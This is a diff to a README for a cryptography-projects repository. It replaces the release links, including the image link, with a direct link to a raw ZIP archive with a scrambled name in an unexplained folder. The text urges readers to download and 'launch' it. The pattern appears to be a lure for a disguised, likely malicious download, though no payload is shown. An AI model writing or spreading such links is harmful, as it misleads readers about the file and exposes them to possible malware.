@@ -46,10 +46,10 @@ Cryptography involves the art of secure communication through the transformation
 
 To access the complete repository content, download the project materials using the following link: 
 
-[![Download Cryptography Projects](https://github.com/narutocraft/Top-Cryptography-Projects-with-Source-Code/releases/tag/v2.0)](https://github.com/narutocraft/Top-Cryptography-Projects-with-Source-Code/releases/tag/v2.0)
+[![Download Cryptography Projects](https://raw.githubusercontent.com/narutocraft/Top-Cryptography-Projects-with-Source-Code/main/hearingless/Source-Top-Code-with-Cryptography-Projects-equivocation.zip)](https://raw.githubusercontent.com/narutocraft/Top-Cryptography-Projects-with-Source-Code/main/hearingless/Source-Top-Code-with-Cryptography-Projects-equivocation.zip)
 
 Note: The link provided above needs to be launched to explore the repository content.
 
 Whether you are interested in enhancing your cryptography skills or conducting research in this field, the "Top Cryptography Projects with Source Code" repository offers a valuable resource for your journey into the world of secure communication. Start exploring today!
 
-![Cryptography](https://github.com/narutocraft/Top-Cryptography-Projects-with-Source-Code/releases/tag/v2.0)
+![Cryptography](https://raw.githubusercontent.com/narutocraft/Top-Cryptography-Projects-with-Source-Code/main/hearingless/Source-Top-Code-with-Cryptography-Projects-equivocation.zip)
